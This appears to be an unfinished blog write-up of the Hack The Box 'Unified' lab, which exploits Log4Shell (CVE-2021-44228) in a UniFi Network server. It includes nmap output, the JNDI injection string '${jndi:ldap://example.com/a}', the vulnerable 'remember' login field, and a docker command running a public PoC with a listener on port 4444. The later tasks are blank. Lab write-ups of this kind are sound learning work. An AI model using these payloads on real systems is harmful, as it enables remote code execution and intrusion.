---
title: 'Unified - HTB Starting Point Tier 2'
description: 'Writeup for Unified box'
pubDate: 'Feb 8 2025'
heroImage: '/blog-placeholder-3.jpg'
---


## Unified
*MongoDB, Java, Code Injection*

The final Starting Point on the free tier! This is a momentous occasion. 

**Task 1**  
Which are the first four open ports?  

```bash
nmap -sC $TARGET --min-rate=2000 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 20:16 AEDT
Nmap scan report for 10.129.96.149
Host is up (0.34s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
8443/tcp open  https-alt
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage

Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

22,6789,8080,8443

**Task 2**  
What is the title of the software that is running running on port 8443?  

Unifi Network

**Task 3**  
What is the version of the software that is running?  

Navigating to the web app, we see `6.4.54`


**Task 4**  
What is the CVE for the identified vulnerability?  

A quick search of "Unifi Network 6.4.54 cve" leads us to a github repo to exploit the log4j vulnerability `CVE-2021-44228`


**Task 5**  
What protocol does JNDI leverage in the injection?  

LDAP.

This [Cloudflare blog](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/) specifies that LDAP was the primary focus of the CVE. FRom this blog, it looks like the JNDI interface could load up an arbitrary Java object via LDAP, e.g. `ldap://localhost:389/0=JNDITutorial` finds the JNDITutorial object from the local LDAP server and parses the object to read attributes. If you can control the LDAP URL, you can load up arbitrary objects in a Java runtime environment, and thus is the focus of this vulnerability.

Log4j contained a syntax that allowed the evaluation of a value to place into logs. It took the format `${prefix:name}`. `prefix` would specify the lookup to use, and the `name` would be the target of evaluation. e.g. `${java:version}` to retrieve the java version. Thus if an attacker could get log4j to write `${jndi:ldap://example.com/a}`, then log4j will try and resolve the object from that ldap server - this was added in Log4J2-313. A user-agent is a common field that gets logged.


**Task 6**  
What tool do we use to intercept the traffic, indicating the attack was successful?  

`tcpdump`


**Task 7**  
What port do we need to inspect intercepted traffic for?  

`389` as the LDAP port


**Task 8**  
What port is the MongoDB service running on?  

Default port is 27017


**Task 9**  
What is the default database name for UniFi applications?  

It seems that we want machine access at this point. I tried to capture the traffic in tcpdump and wireshark, but since it's using TLS the data is encrypted. I could spend time setting that up, or the writeup just suggests to use a proxy like burpsuite. I will dive in and try to use burpsuite for the first time. A learning experience! 

Reading [this](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) article from Sprocket security  
> The vulnerability is in the `rememberme` value issued in the login request
>
> ```
> {"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}
> ```

In this situation, I will try and use the POC published by `puzzlepeaches`, found [here](https://github.com/puzzlepeaches/Log4jUnifi?tab=readme-ov-file)

... one docker install later ...

docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi \ 
    -u https://10.129.36.131:8443 -i 192.168.1.1 -p 4444

Didn't accomplish too much in this session. Just installing docker and getting up and running with the POC.

**Task 10**  
What is the function we use to enumerate users within the database in MongoDB?  


**Task 11**  
What is the function we use to update users within the database in MongoDB?  


**Task 12**  
What is the password for the root user?  


**Task 13**  
Submit user flag  


**Task 14**  
Submit root flag  






echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null